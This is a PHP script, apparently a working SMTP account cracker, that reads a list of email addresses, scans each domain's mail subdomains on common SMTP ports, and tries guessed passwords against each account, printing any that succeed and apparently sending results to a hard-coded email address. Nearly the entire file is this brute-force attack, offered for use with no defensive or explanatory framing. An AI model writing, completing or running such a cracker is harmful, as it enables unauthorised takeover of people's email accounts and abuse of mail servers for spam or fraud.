<?php

include 'roote.php';

define('SPACE', "\n");

error_reporting(0);

#############################################

/* YOUR FUCKING EMAIL HERE */

$your_email = "boostiniofficiel@gmail.com";

############################################

ini_set("default_socket_timeout", 3);

$keyword_list = array("smtp","mail","webmail","aspmx.l","smtp-relay","mx");

$smtp_port = array('25' , "587" ,"465" ,"2525" ,"2526");

$banned = array('yahoo','gmail' ,'live','hotmail');

//Geting email list 

foreach (file("mail.txt") as $go_email) { // first for each 

    // remove space

     $email = preg_replace('/\s+/', '', $go_email);

     if (filter_var($email, FILTER_VALIDATE_EMAIL)) { // validate email

      echo SPACE;

      echo SPACE;

      echo " [*]  " . $email ." = VALID";

      echo SPACE;

      echo SPACE;

      echo " [+] Domaine =  " .domaine($email);

      echo SPACE;

      echo SPACE;

      echo  " [+] Username =  " .user_bb($email) ;

   if( in_array( ltd_(domaine($email)) ,$banned ) )


{ // if banned 
   
    echo SPACE;

    echo SPACE;

    echo ":'( --------------------- BANNED";

    echo SPACE;

    echo SPACE;


} /* end of if banned */ else { // else start 


for ($i=0; $i <count($keyword_list) ; $i++) {  // keywrod start 
  
   for ($z=0; $z <count($smtp_port) ; $z++) { // smtp start 

    if (check_cnx($keyword_list[$i]. "." .domaine($email),$smtp_port[$z]) ==  "1") { // if port start 

      echo SPACE;

      echo SPACE;

      echo " [+] PORT SCAN =  " . $keyword_list[$i].".".domaine($email).":".$smtp_port[$z] . " ==> is OPEN" ;

      for ($i=0; $i <count(pass_array($email)) ; $i++) {  // test email

     if (smtp("smtp.".domaine($email),$email,pass_array($email)[$i],$smtp_port[$z],$your_email) == true) { // test password

      echo "\n";

      echo "\n"; 

      echo  "  == > PASSWORD FOUND  <===> " . pass_array($email)[$i] .  "\n". "\n";


     continue 4;

     
 }  else {
   
   echo "\n";

   echo SPACE;

   echo "  ".pass_array($email)[$i] .  "== > BAD PASSWORD" . "\n";

 }
}
}
else {

      echo SPACE;

      echo SPACE;

      echo " [-] PORT SCAN =  " . $keyword_list[$i].".".domaine($email).":".$smtp_port[$z] . " ==> is CLOSED" ."\n";

    }

    } 

   }
  
}



     } else {

      echo SPACE;

      echo SPACE;

      echo " [*]  " . $email ." = NOT AN EMAIL ADRESS";


} // end of else


  } // end of validate email
